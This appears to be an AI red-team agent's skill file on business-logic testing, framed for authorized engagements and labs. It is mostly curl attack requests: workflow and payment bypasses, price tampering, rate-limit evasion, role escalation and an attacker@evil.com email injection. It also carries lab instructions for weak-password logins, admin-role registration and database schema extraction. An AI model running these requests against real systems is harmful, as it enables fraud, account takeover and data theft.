---
name: business-logic-testing
description: Business logic vulnerability detection — workflow bypass, price manipulation, state abuse, and application-specific flaws
origin: RedteamOpencode
---

# Business Logic Testing

## When to Activate

- Application has multi-step workflows (checkout, registration, KYC, approval)
- Financial operations exist (payments, transfers, balance, discounts, coupons)
- Role-based access with state transitions (pending → approved → completed)
- Any feature where the intended sequence of operations matters
- Application trusts client-side values for server-side decisions

## Tools

- `run_tool curl` — craft requests with manipulated parameters
- `run_tool ffuf` — fuzz parameter values for boundary conditions
- Browser DevTools — observe workflow state and hidden parameters

For live engagement target requests, prefer plain `run_tool curl` and let the current
engagement's `auth.json` flow through `rtcurl` automatically. Only add explicit
`-b` / `-H "Authorization: ..."` when intentionally testing alternate identities,
broken session handling, or auth override behavior.

## Methodology

### 1. Workflow Bypass

Test if steps in multi-step processes can be skipped:

```bash
# Identify all steps in a workflow (e.g., checkout)
# Step 1: /cart → Step 2: /shipping → Step 3: /payment → Step 4: /confirm

# Skip directly to final step
run_tool curl -s -X POST "http://target/api/order/confirm" \
  -H "Content-Type: application/json" \
  -d '{"orderId":"123"}'

# Skip payment step — go from shipping to confirm
run_tool curl -s -X POST "http://target/api/order/confirm" \
  -H "Content-Type: application/json" \
  -d '{"orderId":"123","shippingId":"456"}'

# Repeat a step that should only execute once (e.g., apply coupon)
run_tool curl -s -X POST "http://target/api/coupon/apply" \
  -d '{"code":"DISCOUNT50","orderId":"123"}'
# Apply same coupon again
run_tool curl -s -X POST "http://target/api/coupon/apply" \
  -d '{"code":"DISCOUNT50","orderId":"123"}'
```

### 2. Price / Value Manipulation

Test if financial values can be tampered:

```bash
# Negative quantity
run_tool curl -s -X POST "http://target/api/cart/add" \
  -d '{"productId":"1","quantity":-5,"price":100}'

# Zero price
run_tool curl -s -X POST "http://target/api/cart/add" \
  -d '{"productId":"1","quantity":1,"price":0}'

# Fractional values where integer expected
run_tool curl -s -X POST "http://target/api/cart/add" \
  -d '{"productId":"1","quantity":0.001}'

# Overflow: extremely large values
run_tool curl -s -X POST "http://target/api/transfer" \
  -d '{"amount":99999999999999}'

# Modify price in request (if client sends price)
# Compare: does server validate price matches catalog?
run_tool curl -s -X POST "http://target/api/order/create" \
  -d '{"productId":"1","quantity":1,"price":0.01}'

# Currency confusion — send different currency code
run_tool curl -s -X POST "http://target/api/payment" \
  -d '{"amount":100,"currency":"JPY"}'
```

### 3. State Abuse / Transition Bypass

Test if state transitions can be manipulated:

```bash
# Modify status directly
run_tool curl -s -X PUT "http://target/api/order/123" \
  -d '{"status":"completed"}'

# Cancel after completion
run_tool curl -s -X POST "http://target/api/order/123/cancel"

# Re-open closed ticket/order
run_tool curl -s -X PUT "http://target/api/order/123" \
  -d '{"status":"pending"}'

# Access resources in wrong state
# e.g., download invoice before payment
run_tool curl -s "http://target/api/order/123/invoice"

# Modify data after approval
run_tool curl -s -X PUT "http://target/api/application/123" \
  -d '{"amount":999999}'
```

### 4. Rate Limit / Abuse Prevention Bypass

```bash
# Brute force with no rate limit
for i in $(seq 1 100); do
  run_tool curl -s -X POST "http://target/api/coupon/redeem" \
    -d "{\"code\":\"GUESS$i\"}" -o /dev/null -w "%{http_code}\n"
done

# Bypass rate limit via IP rotation headers
run_tool curl -s -X POST "http://target/api/login" \
  -H "X-Forwarded-For: 1.2.3.$((RANDOM % 255))" \
  -d '{"user":"admin","pass":"test"}'

# Bypass via case variation
run_tool curl -s "http://target/api/coupon/apply" -d '{"code":"DISCOUNT50"}'
run_tool curl -s "http://target/api/coupon/apply" -d '{"code":"discount50"}'
run_tool curl -s "http://target/api/coupon/apply" -d '{"code":"Discount50"}'
```

### 5. Feature Abuse

```bash
# Email/notification abuse — trigger mass emails
run_tool curl -s -X POST "http://target/api/invite" \
  -d '{"emails":["a@x.com","b@x.com","c@x.com",...1000 emails]}'

# Referral abuse — refer yourself
run_tool curl -s -X POST "http://target/api/referral" \
  -d '{"referralCode":"MY_CODE"}' -b "session=TOKEN_DIFFERENT_ACCOUNT"

# Gift card / point manipulation
# Buy gift card with gift card balance
run_tool curl -s -X POST "http://target/api/purchase" \
  -d '{"product":"gift_card","paymentMethod":"gift_card_balance"}'

# Time-based abuse — use expired offer
run_tool curl -s -X POST "http://target/api/offer/apply" \
  -d '{"offerId":"expired_offer_123"}'

# Privilege escalation via profile update
run_tool curl -s -X PUT "http://target/api/user/profile" \
  -d '{"role":"admin","isAdmin":true,"userType":"staff"}'
```

### 6. Input Validation Logic Flaws

```bash
# Type confusion — string where number expected
run_tool curl -s -X POST "http://target/api/transfer" \
  -d '{"amount":"abc","to":"user2"}'

# Boolean confusion
run_tool curl -s -X POST "http://target/api/settings" \
  -d '{"isPublic":"true"}' # string vs boolean
run_tool curl -s -X POST "http://target/api/settings" \
  -d '{"isPublic":1}' # number vs boolean

# Array where single value expected
run_tool curl -s -X POST "http://target/api/user/update" \
  -d '{"email":["admin@target.com","attacker@evil.com"]}'

# Null / undefined injection
run_tool curl -s -X POST "http://target/api/payment" \
  -d '{"amount":null}'
run_tool curl -s -X POST "http://target/api/payment" \
  -d '{}'
```

### 7. Multi-Currency / Rounding / Unit-Confusion Abuse

```bash
# Rounding-down exploitation on fractional unit prices (buy in bulk to accumulate a free unit)
run_tool curl -s -X POST "http://target/api/cart/add" \
  -d '{"productId":"1","quantity":1000,"price":0.0049}'

# Currency-precision mismatch: pay in a currency with fewer decimal places than the ledger expects
run_tool curl -s -X POST "http://target/api/payment" \
  -d '{"amount":100,"currency":"JPY"}'   # JPY has 0 minor units — some backends still divide by 100

# Weight/quantity unit confusion (kg vs g, item vs case) on inventory-priced goods
run_tool curl -s -X POST "http://target/api/cart/add" \
  -d '{"productId":"bulk-item","quantity":1,"unit":"g"}'   # priced per-kg elsewhere

# Coupon stacking via differently-cased or whitespace-padded codes bypassing a single-use check
run_tool curl -s "http://target/api/coupon/apply" -d '{"code":" DISCOUNT50"}'
run_tool curl -s "http://target/api/coupon/apply" -d '{"code":"DISCOUNT50 "}'
run_tool curl -s "http://target/api/coupon/apply" -d '{"code":"DISCOUNT50​"}'  # zero-width space
```

### 8. Referential / Cross-Object State Abuse

- [ ] Split-payment abuse: pay for one order partially, then reference that partial-payment transaction ID against a *different*, more expensive order
- [ ] Shared-cart/session confusion: two authenticated tabs/sessions manipulating the same server-side cart object — apply an item from account A's session while authenticated as account B if cart ID is guessable/sequential
- [ ] Negative-balance-as-credit: transfer a negative amount to yourself from another account to increase your own balance instead of decreasing theirs, if the sign isn't re-validated server-side after the initial request
- [ ] Downgrade-then-refund: purchase a premium tier, use the feature, downgrade to trigger a refund calculation bug that refunds more than was paid, or leaves premium access active post-downgrade
- [ ] Webhook/callback trust: if a payment provider calls back to confirm a transaction, test whether the callback endpoint validates the signature/source — an attacker-forged "payment succeeded" callback can flip order state without paying

### 9. Lab objective recall contract

When the active profile (`lab-profile.json`) lists business-logic objectives, keep the following
challenge-triggering logic probes alive until they either produce solved-state evidence or are
requeued with the exact blocker. Do not retire these as "duplicate" just because a broader
endpoint finding already exists. Consult the profile's `recall_branches` for the exact routes
and payload hints.

- Feedback/rating workflows: submit and verify each profile objective that maps to a rating or
  feedback action (for example a five-star rating and a forged/alternate-author feedback path).
  Exercise the feedback endpoint with the exact rating/author context the objective requires,
  then check the objective source (`python3 ./scripts/lab_objective.py snapshot "$DIR"`) before
  marking the case done.
- Weak-password recall: after any credential leak, admin token, or account takeover, attempt
  one bounded weak-password login/change/reset branch for the accounts named in `intel.md` and
  record whether the objective flips. If only missing credentials block it, return `REQUEUE`
  with the exact credential source already checked.
- Admin-registration recall: when registration is available, run one bounded account-creation
  mutation that explicitly attempts the admin-role trigger (registration API or native register
  workflow with `role=admin` / equivalent role field), then check the objective source. If the
  API strips the role or the UI omits the field, return `REQUEUE` with the exact request body,
  observed response, and remaining role-injection surface instead of closing registration as
  generic create-account coverage.
- Database-schema recall: when SQL injection or admin data exposure is confirmed, perform one
  schema-oriented probe (`sqlite_master`, `information_schema`, ORM metadata, or the equivalent
  DB error path) and preserve the response artifact. Do not stop at admin login success if
  schema extraction has not been attempted.
- If any profile business-logic objective is still untested after the relevant endpoint is
  discovered, emit `REQUEUE` with a concrete `api` or `form` follow-up instead of
  `DONE STAGE=exhausted`.
- A functionally successful request is not enough for closure. If a feedback POST returns 201,
  a weak-password branch reaches the expected endpoint, or a schema/error path returns data but
  the objective source still shows the objective as unsolved, preserve the request/response
  artifact and return `REQUEUE` with the exact next triggering payload or browser route to try.
  Do not let the operator proceed to report on "technical evidence remains" when solved-state
  evidence disagrees.
- Sibling objectives are not substitutes. If evidence satisfies two related objectives on paper
  but the objective source still reports either as unsolved, requeue one exact payload/consumer
  path for each before report.

## What to Record

- **Workflow step** that was bypassed or abused
- **Expected behavior** vs **actual behavior**
- **Financial impact** if applicable (e.g., "purchased item for $0")
- **Exact request/response** proving the logic flaw
- **Reproducibility** — can it be repeated?
- **Severity** — based on business impact, not just technical impact:
  - HIGH: financial loss, unauthorized transactions, data manipulation
  - MEDIUM: workflow bypass, feature abuse, state corruption
  - LOW: minor logic inconsistency, informational leak via logic
